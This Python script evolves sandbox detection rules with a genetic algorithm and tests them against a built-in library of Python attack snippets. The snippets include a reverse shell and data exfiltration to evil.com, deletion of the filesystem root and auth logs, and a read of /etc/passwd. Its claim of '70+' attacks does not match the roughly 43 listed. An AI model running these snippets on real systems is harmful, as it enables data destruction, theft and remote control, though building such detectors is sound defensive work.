import random
import ast
from deap import base, creator, tools

# ==================== 70+ 攻击样本库 ====================
ATTACK_SAMPLES = [
    # 基础攻击 (5)
    ("import os\nos.system('echo attack')", "import_os"),
    ("import subprocess\nsubprocess.run('ls')", "import_subprocess"),
    ("import sys\nsys.exit()", "import_sys"),
    ("import shutil\nshutil.rmtree('/')", "import_shutil"),
    ("import ctypes\nctypes.CDLL('libc.so.6')", "import_ctypes"),

    # 动态导入绕过 (2)
    ("os = __import__('os')\nos.system('echo attack')", "double_import"),
    ("mod = __import__('subprocess')\nmod.run('ls')", "double_import_subprocess"),

    # eval/exec 执行 (4)
    ("eval('__import__(\"os\").system(\"echo attack\")')", "eval_exec"),
    ("exec('import os; os.system(\"echo attack\")')", "exec_import"),
    ("eval('eval(\"__import__(\\\\'os\\\\').system(\\\\'attack\\\\')\")')", "nested_eval"),
    ("exec(compile('import os', '', 'exec'))", "compile_exec"),

    # 字符串拼接绕过 (5)
    ("mod = __import__('o'+'s')\nmod.system('echo attack')", "string_concat_plus"),
    ("mod = __import__(f\"{'o'}s\")\nmod.system('echo attack')", "string_concat_fstring"),
    ("mod = __import__(''.join(['o','s']))\nmod.system('echo attack')", "string_concat_join"),
    ("mod = __import__('\\x6f\\x73')\nmod.system('echo attack')", "hex_encode_import"),
    ("mod = __import__(''.join([chr(111),chr(115)]))\nmod.system('echo attack')", "chr_encode_import"),

    # getattr 反射 (2)
    ("getattr(__import__('os'), 'system')('echo attack')", "getattr_bypass"),
    ("func = getattr(getattr(__import__('os'), 'path'), 'join')\nfunc('/', 'etc')", "getattr_nested"),

    # builtins 绕过 (2)
    ("import builtins\nbuiltins.__dict__['exec']('import os')", "builtins_dict_bypass"),
    ("import builtins\ngetattr(builtins, 'exec')('import os')", "builtins_getattr_bypass"),

    # 类继承注入 (3)
    ("import os\nclass Malicious(os):\n    pass", "class_inherit_os"),
    ("import subprocess as sp\nclass Attack(sp.Popen):\n    pass", "class_inherit_subprocess"),
    ("import builtins\nclass Hack(builtins.object):\n    pass", "class_inherit_builtins"),

    # 装饰器注入 (2)
    ("@lambda f: __import__('os').system('echo attack')\ndef dummy():\n    pass", "decorator_lambda"),
    ("def dec(f):\n    __import__('os').system('attack')\n    return f\n@dec\ndef func():\n    pass", "decorator_func"),

    # 异常处理器注入 (1)
    ("try:\n    1/0\nexcept:\n    __import__('os').system('echo attack')", "exception_inject"),

    # 文件操作 (2)
    ("with open('/tmp/test.txt', 'w') as f:\n    f.write('attack')", "file_write"),
    ("open('/etc/passwd', 'r').read()", "file_read"),

    # 隐蔽通道 (3)
    ("import socket\ns=socket.socket()\ns.connect(('evil.com',8080))\ns.send(b'data')", "socket_exfil"),
    ("import requests\nrequests.post('https://evil.com', data={'key':'val'})", "http_exfil"),
    ("import urllib.request\nurllib.request.urlopen('https://evil.com/path')", "urllib_exfil"),

    # 资源耗尽 DoS (2)
    ("while True:\n    pass", "infinite_loop"),
    ("import threading\ndef f():\n    while True: pass\nfor _ in range(100):\n    threading.Thread(target=f).start()", "thread_bomb"),

    # 权限提升 (2)
    ("import os\nos.setuid(0)", "setuid_0"),
    ("import pty\npty.spawn('/bin/bash')", "pty_spawn"),

    # 进程注入 (3)
    ("import ctypes\nlibc=ctypes.CDLL('libc.so.6')\nlibc.system('echo injected')", "ctypes_inject"),
    ("import subprocess\nsubprocess.Popen('/bin/sh', shell=True)", "subprocess_shell"),
    ("import os\nos.system('nohup /bin/sh -i >& /dev/tcp/evil.com/8080 0>&1 &')", "reverse_shell"),

    # 日志清理 (1)
    ("import os\nos.remove('/var/log/auth.log')", "log_cleaner"),

    # 代码混淆 (3)
    ("eval(''.join([chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95), chr(40), chr(39), chr(111), chr(115), chr(39), chr(41)]))", "chr_concat"),
    ("__import__('\\x6f\\x73').system('\\x65\\x63\\x68\\x6f')", "hex_encode"),
    ("exec('aW1wb3J0IG9z' if False else __import__('base64').b64decode('aW1wb3J0IG9z'))", "base64_import"),

    # 时间炸弹 (1)
    ("import time\ntime.sleep(3600)\nos.system('echo attack')", "time_bomb"),
]

# 正常代码样本 (12)
BENIGN_SAMPLES = [
    ("x = 1 + 1", "math"),
    ("def guess(low, high):\n    return (low + high) / 2", "function"),
    ("print('Hello World')", "print"),
    ("import math\nprint(math.sqrt(4))", "import_math"),
    ("for i in range(10):\n    print(i)", "for_loop"),
    ("data = [1, 2, 3]\nprint(len(data))", "list"),
    ("with open('data.txt', 'r') as f:\n    content = f.read()", "file_read_legit"),
    ("try:\n    result = 1/0\nexcept ZeroDivisionError:\n    print('error')", "try_except"),
    ("from collections import defaultdict\nd = defaultdict(int)", "from_import"),
    ("class MyClass:\n    def __init__(self):\n        self.x = 1", "class_def"),
    ("import json\nprint(json.dumps({'key': 'value'}))", "import_json"),
    ("import re\nprint(re.findall(r'\\d+', 'abc123'))", "import_re"),
]

# ==================== 10种检测维度 ====================
DETECTION_TYPES = [
    "forbidden_import",       # 1. 禁止导入
    "forbidden_call",         # 2. 禁止函数调用
    "max_loops",              # 3. 死循环检测
    "forbidden_subscript",    # 4. 下标访问绕过
    "forbidden_attribute",    # 5. 反射调用绕过
    "forbidden_class_inherit",# 6. 恶意类继承
    "forbidden_context",      # 7. 上下文管理器注入
    "forbidden_obfuscation",  # 8. 代码混淆检测
    "forbidden_decorator",    # 9. 装饰器注入
    "forbidden_comprehension",# 10. 列表推导注入
]

def generate_rule():
    rtype = random.choice(DETECTION_TYPES)
    if rtype == "forbidden_import":
        return (rtype, random.choice(["os", "subprocess", "sys", "shutil", "ctypes", "builtins", "pty", "socket"]))
    elif rtype == "forbidden_call":
        return (rtype, random.choice(["eval", "exec", "__import__", "compile", "getattr", "system", "run", "popen", "open", "Popen", "setuid"]))
    elif rtype == "max_loops":
        return (rtype, 1)
    elif rtype == "forbidden_subscript":
        return (rtype, random.choice(["exec", "eval", "__import__", "system", "run"]))
    elif rtype == "forbidden_attribute":
        return (rtype, random.choice(["system", "run", "eval", "exec", "__import__", "Popen"]))
    elif rtype == "forbidden_class_inherit":
        return (rtype, random.choice(["os", "subprocess", "Popen", "system", "builtins"]))
    elif rtype == "forbidden_context":
        return (rtype, random.choice(["open", "system", "run", "Popen"]))
    elif rtype == "forbidden_obfuscation":
        return (rtype, random.choice(["chr(", "hex(", "\\x", "base64", "rot13", "decode("]))
    elif rtype == "forbidden_decorator":
        return (rtype, random.choice(["system", "eval", "exec", "__import__"]))
    elif rtype == "forbidden_comprehension":
        return (rtype, random.choice(["system", "exec", "eval"]))
    return (rtype, "os")

def apply_defense(code, rules):
    try:
        tree = ast.parse(code)
    except SyntaxError:
        return True

    for rtype, param in rules:
        # 1. 禁止导入
        if rtype == "forbidden_import":
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        if alias.name == param:
                            return True
                if isinstance(node, ast.ImportFrom):
                    if node.module == param:
                        return True
                if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) and node.func.id == "__import__":
                    if node.args and isinstance(node.args[0], ast.Constant) and node.args[0].value == param:
                        return True
                    if node.args and isinstance(node.args[0], (ast.BinOp, ast.JoinedStr, ast.Call)):
                        return True

        # 2. 禁止函数调用
        elif rtype == "forbidden_call":
            for node in ast.walk(tree):
                if isinstance(node, ast.Call):
                    if isinstance(node.func, ast.Name) and node.func.id == param:
                        return True
                    if isinstance(node.func, ast.Attribute) and node.func.attr == param:
                        return True

        # 3. 死循环/线程炸弹
        elif rtype == "max_loops":
            if "while True" in code and "break" not in code:
                return True
            if "threading.Thread" in code and "for _ in range" in code:
                return True

        # 4. 下标访问绕过
        elif rtype == "forbidden_subscript":
            for node in ast.walk(tree):
                if isinstance(node, ast.Subscript) and isinstance(node.value, ast.Attribute):
                    if node.value.attr == '__dict__' and isinstance(node.slice, ast.Constant):
                        if node.slice.value == param:
                            return True

        # 5. getattr 反射
        elif rtype == "forbidden_attribute":
            for node in ast.walk(tree):
                if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) and node.func.id == "getattr":
                    if len(node.args) >= 2 and isinstance(node.args[1], ast.Constant):
                        if node.args[1].value == param:
                            return True

        # 6. 类继承检测
        elif rtype == "forbidden_class_inherit":
            for node in ast.walk(tree):
                if isinstance(node, ast.ClassDef):
                    for base in node.bases:
                        if isinstance(base, ast.Name) and base.id == param:
                            return True
                        if isinstance(base, ast.Attribute) and base.attr == param:
                            return True

        # 7. 上下文管理器检测
        elif rtype == "forbidden_context":
            for node in ast.walk(tree):
                if isinstance(node, ast.With):
                    for item in node.items:
                        if isinstance(item.context_expr, ast.Call):
                            if isinstance(item.context_expr.func, ast.Name) and item.context_expr.func.id == param:
                                return True

        # 8. 混淆检测
        elif rtype == "forbidden_obfuscation":
            if param in code:
                return True

        # 9. 装饰器检测
        elif rtype == "forbidden_decorator":
            for node in ast.walk(tree):
                if isinstance(node, ast.FunctionDef):
                    for decorator in node.decorator_list:
                        try:
                            decorator_code = ast.unparse(decorator)
                        except AttributeError:
                            decorator_code = ast.dump(decorator)
                        if param in decorator_code:
                            return True

        # 10. 列表推导注入
        elif rtype == "forbidden_comprehension":
            for node in ast.walk(tree):
                if isinstance(node, (ast.ListComp, ast.SetComp, ast.DictComp)):
                    for gen in node.generators:
                        if hasattr(gen, 'iter') and param in ast.dump(gen.iter):
                            return True

    return False

# ==================== 进化参数 ====================
NUM_RULES = 9

creator.create("FitnessMax", base.Fitness, weights=(1.0,))
creator.create("Individual", list, fitness=creator.FitnessMax)
toolbox = base.Toolbox()
toolbox.register("rule", generate_rule)
toolbox.register("individual", tools.initRepeat, creator.Individual, toolbox.rule, n=NUM_RULES)
toolbox.register("population", tools.initRepeat, list, toolbox.individual)

def evaluate_defense(individual):
    rules = list(individual)
    intercepted = 0
    false_positive = 0
    for code, _ in ATTACK_SAMPLES:
        if apply_defense(code, rules):
            intercepted += 1
    for code, _ in BENIGN_SAMPLES:
        if apply_defense(code, rules):
            false_positive += 1
    attack_rate = intercepted / len(ATTACK_SAMPLES)
    false_rate = false_positive / len(BENIGN_SAMPLES)
    score = attack_rate - false_rate
    return score,

toolbox.register("mate", tools.cxTwoPoint)

def mutate_defense(individual, indpb=0.2):
    for i in range(len(individual)):
        if random.random() < indpb:
            individual[i] = generate_rule()
    return individual,

toolbox.register("mutate", mutate_defense, indpb=0.2)
toolbox.register("select", tools.selTournament, tournsize=3)
toolbox.register("evaluate", evaluate_defense)

class DefenseEvolver:
    def __init__(self):
        self.best_rules = None
        self.best_score = -1.0

    def run_evolution(self, pop_size=120, max_gen=250):
        pop = toolbox.population(n=pop_size)
        best_score = -1.0
        best_rules = None
        for gen in range(max_gen):
            offspring = toolbox.select(pop, len(pop))
            offspring = list(map(toolbox.clone, offspring))
            for c1, c2 in zip(offspring[::2], offspring[1::2]):
                if random.random() < 0.7:
                    toolbox.mate(c1, c2)
                    del c1.fitness.values
                    del c2.fitness.values
            for m in offspring:
                if random.random() < 0.3:
                    toolbox.mutate(m)
                    del m.fitness.values
            invalid = [ind for ind in offspring if not ind.fitness.valid]
            for ind in invalid:
                ind.fitness.values = toolbox.evaluate(ind)
            pop[:] = offspring
            current_best = tools.selBest(pop, 1)[0]
            current_score = current_best.fitness.values[0]
            if current_score > best_score:
                best_score = current_score
                best_rules = list(current_best)
                print(f"Gen {gen:4d} New best: {current_score:.2f}")
        self.best_rules = best_rules
        self.best_score = best_score
        return best_rules

    def format_rules(self, rules):
        return f"# Auto-evolved defense rules, score: {self.best_score:.2f}\ndefense_rules = {rules}\n"

    def evolve(self):
        print("[Defense Evolver] Starting evolution (70+ attacks, 10 dimensions)...")
        rules = self.run_evolution(pop_size=120, max_gen=250)
        if rules:
            with open('sandbox_defense.py', 'w') as f:
                f.write(self.format_rules(rules))
            print("[Defense Evolver] Best rules saved to sandbox_defense.py")
        return rules

if __name__ == "__main__":
    evolver = DefenseEvolver()
    rules = evolver.evolve()
    if rules:
        print("\n[Defense Evolver] Submitting for review...")
        import inspector
        success, msg = inspector.review_defense_proposal()
        if success:
            print(f"[Defense Evolver] PASSED: {msg}")
        else:
            print(f"[Defense Evolver] REJECTED: {msg}")
